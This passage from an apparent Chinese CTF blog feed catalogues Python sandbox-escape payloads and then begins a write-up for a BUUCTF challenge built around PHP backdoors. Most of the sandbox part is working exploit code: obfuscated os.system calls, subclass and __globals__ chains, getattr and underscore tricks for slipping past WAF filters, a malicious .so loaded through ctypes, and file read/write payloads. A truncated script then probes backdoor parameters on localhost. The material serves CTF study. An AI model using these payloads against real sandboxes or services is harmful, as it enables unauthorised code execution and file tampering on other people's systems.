class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;so&#x27;</span>[::<span class="number">-1</span>]).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">b = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;s&#x27;</span></span><br><span class="line">__import__(a+b).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::<span class="number">-1</span>])</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>exec(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::<span class="number">-1</span>])</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure><p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等</p><h3 id="getattr"><a href="#getattr" class="headerlink" title="getattr()"></a>getattr()</h3><p><code>__globals__</code>：返回一个当前空间下能使用的模块，方法和变量的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line"><span class="meta">... </span>    name=<span class="string">&quot;Moonback&quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t=test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;name&quot;</span>)<span class="comment">#获取name属性，存在就打印出来。</span></span><br><span class="line"><span class="string">&#x27;Moonback&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;run&quot;</span>)<span class="comment">#获取run方法，存在就打印出方法的内存地址。</span></span><br><span class="line">&lt;bound method test.run of &lt;__main__.test object at <span class="number">0x00000110F74FC4E0</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;run&quot;</span>)() <span class="comment">#获取run方法，后面加括号可以将这个方法运行。</span></span><br><span class="line"><span class="string">&#x27;HelloWorld&#x27;</span></span><br></pre></td></tr></table></figure><p>如果<code>.</code>被waf,可以用<code>getattr()</code>来替代。<br><strong>payload：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>转换过程</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__ ==&gt; getattr([],&#x27;__class__&#x27;)</span><br><span class="line">[].__class__.__base__ ==&gt; getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59]#后面有括号</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;]</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__base__&#x27;</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)()[<span class="number">59</span>],<span class="string">&#x27;__init__&#x27;</span>),<span class="string">&#x27;__globals__&#x27;</span>)[<span class="string">&#x27;linecache&#x27;</span>],<span class="string">&#x27;__dict__&#x27;</span>)[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这种方法的好处是绕过.并且函数名或属性名都用字符串的方式写入payload中。那么可拓展的方法就有很多，例如：</p><p>如果<code>_</code>被waf了,可以用<code>dir(0)[0][0]</code>代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;_&#x27;</span></span><br></pre></td></tr></table></figure><p>比如上面的payload可以转换为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;base&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)()[<span class="number">59</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;init&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;globals&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">&#x27;linecache&#x27;</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;dict&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__()"></a><code>__getattribute__()</code></h3><p><code>__getattribute__</code>是属性访问拦截器，就是当这个类的属性被访问时，会自动调用类的<code>__getattribute__</code>方法。<br><strong>通过__getattribute__我们可以传字符串来进行方法的调用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Test</span>(<span class="params">object</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name=<span class="string">&#x27;Test&#x27;</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            print(self.name)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=Test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__getattribute__(<span class="string">&#x27;echo&#x27;</span>)()</span><br><span class="line">Test</span><br></pre></td></tr></table></figure><p>应用场景: 比如说一个沙盒waf了’ls’导致属性’globals’不能用，那么payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&quot;linecache&quot;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以转换为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&#x27;func_global&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&quot;linecache&quot;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>func_globals</code>: 这个属性指向定义函数时的全局命名空间，返回它所有调用的基类和函数<br><code>__init__</code>： 返回一个函数对象<br><code>__dict__</code>：返回所有属性，包括属性，方法等</p><h3 id="构造so库"><a href="#构造so库" class="headerlink" title="构造so库"></a>构造so库</h3><p>在<code>().__class__.__bases__[0].__subclasses__()</code>中发现有可用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;type <span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">CDLL</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>构造一个so库，列一下/home/ctf/下的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;  </span></span><br><span class="line">void my_init(void) __attribute__((constructor)); </span><br><span class="line">void my_init(void)  </span><br><span class="line">&#123;  </span><br><span class="line">    system(<span class="string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>将编译好的so直接二进制写入/tmp/bk.so<br>使用ctypes加载so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">86</span>](().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">85</span>]).LoadLibrary(<span class="string">&#x27;/tmp/bk.so&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="f修饰符"><a href="#f修饰符" class="headerlink" title="f修饰符"></a>f修饰符</h3><p>在PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码。可以参考此文档 <a href="https://www.python.org/dev/peps/pep-0498/">https://www.python.org/dev/peps/pep-0498/</a></p><p>只有在python3.6.0+的版本才有这个方法。简单来说，可以理解为字符串外层套了一个exec()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="keyword">print</span>(<span class="string">&quot;MoonBack&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">MoonBack</span><br><span class="line"><span class="string">&#x27;None&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;dir&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"> 驱动器 C 中的卷是 Windows</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>这个有点类似于php中的<code>&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;</code>，但python中没有将普通字符串转成f字符串的方法，所以实际使用时效果不明。</p><h2 id="一些常用payload"><a href="#一些常用payload" class="headerlink" title="一些常用payload"></a>一些常用payload</h2><h3 id="利用file类完成文件读取"><a href="#利用file类完成文件读取" class="headerlink" title="利用file类完成文件读取"></a>利用file类完成文件读取</h3><p>利用object子类中的file方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br></pre></td></tr></table></figure><p>上述返回的内容是，相当于open()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;test.py&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 等价于 open(&#x27;test.py&#x27;).read()</span></span><br></pre></td></tr></table></figure><h3 id="调用其他类中的OS模块完成命令执行"><a href="#调用其他类中的OS模块完成命令执行" class="headerlink" title="调用其他类中的OS模块完成命令执行"></a>调用其他类中的OS模块完成命令执行</h3><p>在当前沙箱中，<strong>import</strong>等模块被禁用，但是，在别的模块中如果本身加载有os的模块，我们是可以直接调用的。如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;</span></span><br><span class="line"><span class="class"># 在这个类中，调用了<span class="title">os</span>模块，我们可以间接把<span class="title">os</span>模块调用进来。</span></span><br><span class="line"><span class="class"># <span class="title">win</span> 32</span></span><br><span class="line"><span class="class">().<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[54]</span></span><br><span class="line"><span class="class"># <span class="title">linux</span> 2</span></span><br><span class="line"><span class="class">().<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class"># <span class="title">linux</span> 2 </span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">(<span class="params"></span>).__class__.__bases__[<span class="number">0</span>].__subclasses__(<span class="params"></span>)[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="params"><span class="string">&#x27;ls&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="class"># <span class="title">func_globals</span>:</span>返回一个包含函数全局变量的字典引用；</span><br></pre></td></tr></table></figure><h3 id="遍历找到其他的逃逸方法"><a href="#遍历找到其他的逃逸方法" class="headerlink" title="遍历找到其他的逃逸方法"></a>遍历找到其他的逃逸方法</h3><p>通过上面的一些绕过姿势我们发现，无外乎是利用 subclasses 中的一些特殊的方法或者模块然后来调用一些函数或者模块来读取文件，或者执行命令，那么我们可以遍历所有的系统库，然后找到所有的使用了os等模块的模块，最后遍历 subclasses 列表，找到所有可以绕过的姿势。</p><p>包包哥的python2 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;./test.py&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><p>n3k0大哥的python3 payload<br><strong>python3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">104</span>].__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].modules[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://www.gtfly.top/2019/07/25/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0.[html](www.gtfly.top/2019/07/25/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0.html)">www.gtfly.top/2019/07/25/python沙盒逃逸学习.[html](www.gtfly.top/2019/07/25/python沙盒逃逸学习.html)</a></p><p><a href="https://xz.aliyun.com/t/52">https://xz.aliyun.com/t/52</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)</a></p><p><a href="https://www.freebuf.com/articles/system/203208.html">https://www.freebuf.com/articles/system/203208.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题-综合篇</title>
      <link href="2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/"/>
      <url>2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>记一下综合题目的writeup!</p><a id="more"></a><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>下载<code>www.tar.gz</code>发现是3000多个php后门文件，不过都是执行代码的，写个脚本跑下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/Desktop/www/src&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span 